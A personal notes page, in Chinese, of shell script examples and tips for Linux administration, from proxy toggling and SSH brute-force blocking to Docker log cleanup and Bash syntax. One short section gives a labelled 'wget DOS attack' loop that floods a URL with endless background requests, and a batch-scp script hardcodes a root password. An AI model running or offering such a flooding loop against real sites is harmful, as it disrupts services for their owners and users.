- [shell脚本案例](#shell脚本案例)
  - [切换代理状态](#切换代理状态)
  - [脚本合集](#脚本合集)
  - [防止暴力破解ssh密码](#防止暴力破解ssh密码)
  - [虚拟机创建初始化配置脚本](#虚拟机创建初始化配置脚本)
  - [docker日志检查 日志清理](#docker日志检查-日志清理)
  - [远程批量替换文件脚本](#远程批量替换文件脚本)
  - [wget DOS攻击简单脚本](#wget-dos攻击简单脚本)
  - [telnet可以测试端口是否开放](#telnet可以测试端口是否开放)
  - [查看CPU使用率高的线程](#查看cpu使用率高的线程)
- [shell 技巧](#shell-技巧)
  - [trap wait](#trap-wait)
  - [shell语法坑](#shell语法坑)
  - [变量扩展语法](#变量扩展语法)
  - [文件描述符 重定向](#文件描述符-重定向)
  - [正则表达式匹配](#正则表达式匹配)
  - [shell特殊字符处理](#shell特殊字符处理)

# shell脚本案例

## 切换代理状态

```shell
function toggle_proxy_internal() {
    if [ -z "$1" ]; then
        unset http_proxy
        unset https_proxy
        echo "Proxy settings cleared."
    else
        export http_proxy="$1"
        export https_proxy="$1"
        echo "Proxy set to $1."
    fi
}

# 检查 http_proxy 和 https_proxy 是否已设置
function toggle_proxy() {
    if [ -z "$http_proxy" ] && [ -z "$https_proxy" ]; then
        toggle_proxy_internal "http://192.168.124.7:7890"
    else
        toggle_proxy_internal
    fi
}
```

## 脚本合集 

https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&__biz=MzU5NDg5MzM5NQ==&scene=1&album_id=1688640897556512775&count=3#wechat_redirect

## 防止暴力破解ssh密码
```
#!/bin/sh
#登录失败次数大于10的ip
IP=$(awk '/Failed/{print $(NF-3)}' /var/log/secure | sort |uniq -c |awk '{if($1>10) print $2}')
hostdeny=/etc/hosts.deny
for i in $IP
do
#如果ip不存在，则写入deny文件
if [ ! $(grep $i $hostdeny) ];then
echo "sshd:$i" >> $hostdeny
fi
done
```
## 虚拟机创建初始化配置脚本
```shell
sed -i '/IPADDR=192.168.3/c\IPADDR=192.168.3.xxx' /etc/sysconfig/network-scripts/ifcfg-eth0
systemctl restart network 
ip addr
```


## docker日志检查 日志清理
添加cron可以定期清理
```shell
#!/bin/sh
echo "======== docker containers logs file size ========"  
logs=$(find /var/lib/docker/containers/ -name *-json.log)  
for log in $logs  
        do  
             ls -lh $log   
        done 
```
```shell
#!/bin/sh 
echo "======== start clean docker containers logs ========"  
logs=$(find /var/lib/docker/containers/ -name *-json.log)  
for log in $logs  
        do  
                echo "clean logs : $log"  
                cat /dev/null > $log  
        done  
echo "======== end clean docker containers logs ========"  
```
## 远程批量替换文件脚本

```shell
#!/bin/bash
#scp自动替换文件
IPS="192.168.3.101 192.168.3.102 192.168.3.103 192.168.3.104 192.168.3.105 192.168.3.107 192.168.3.108 192.168.3.110"
for IP in $IPS
do
expect <<- EOF
     spawn scp /www/wwwroot/dev/app/home/view/index/index.html root@$IP:/www/wwwroot/dev/app/home/view/index/index.html
     expect {
		"yes/no" {send "yes\n"; exp_continue}
		"password:" {send "CDLSdm\n"}
	}
     expect eof
EOF
echo "$IP already done"
done
```

## wget DOS攻击简单脚本

```shell
URL="http://www...com"
while true; do
    wget -q -nc $URL -b &>/dev/null
done
```

## telnet可以测试端口是否开放

```shell
telnet 192.168.3.254 3306
```
原理我猜是建立TCP连接  

## 查看CPU使用率高的线程

```shell
#!/bin/bash
LANG=C
PATH=/sbin:/usr/sbin:/bin:/usr/bin
interval=1
length=86400
for i in $(seq 1 $(expr ${length} / ${interval}));do
date
LANG=C ps -eT -o%cpu,pid,tid,ppid,comm | grep -v CPU | sort -n -r | head -20
date
LANG=C cat /proc/loadavg
{ LANG=C ps -eT -o%cpu,pid,tid,ppid,comm | sed -e 's/^ *//' | tr -s ' ' | grep -v CPU | sort -n -r | cut -d ' ' -f 1 | xargs -I{} echo -n "{} + " && echo ' 0'; } | bc -l
sleep ${interval}
done
```

# shell 技巧

## trap wait

例子：

trap "kill $CRONPID; wait $CRONPID" SIGINT SIGTERM

trap捕获SIGINT SIGTERM，类似signal.Notify

wait会等待进程关闭再继续执行


## shell语法坑

shell中变量的值不是是多行字符串，如果是，就会被转换成空格间隔的字符串

## 变量扩展语法

`readonly`说明MARIADB_USERNAME只能被赋值一次。`${MARIADB_USERNAME:-iam}`使用了Bash shell的**变量扩展语法**，其语法格式为`${待测变量:-默认值}`，表示：如果待测变量不存在或其值为空，则返回默认值，否则返回待测变量的值。

还有一个扩展语法是`${var:?print}`，会在不存在变量时打印错误信息退出

来源：goiam课程
https://github.com/marmotedu/iam/blob/book/docs/guide/zh-CN/installation/05_%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93.md

## 文件描述符 重定向

设置永久重定向

Exp:
```shell
exec 3> filename
exec 2>> filename
exec 0< filename
exec 3>&1
```
## 正则表达式匹配

https://blog.csdn.net/dc666/article/details/46007507

```shell
[[ `hostname` =~ -([0-9]+)$ ]] || exit 1          
ordinal=${BASH_REMATCH[1]}
```

## shell特殊字符处理

[source](https://mp.weixin.qq.com/s?__biz=MzU5NDg5MzM5NQ==&mid=2247499943&idx=1&sn=4e1a589411368f77e932228057b48ba9&chksm=fe78cf9bc90f468ddb67f5ae794d3e360c729a86e0c113471111a88974f09e1d879d04670460&mpshare=1&scene=1&srcid=11143Xwns6V0PZas5gSKrWUt&sharer_sharetime=1668396497114&sharer_shareid=1817186607f682c2c8dc4a6ca1d644dc&version=4.1.0.6007&platform=win#rd)
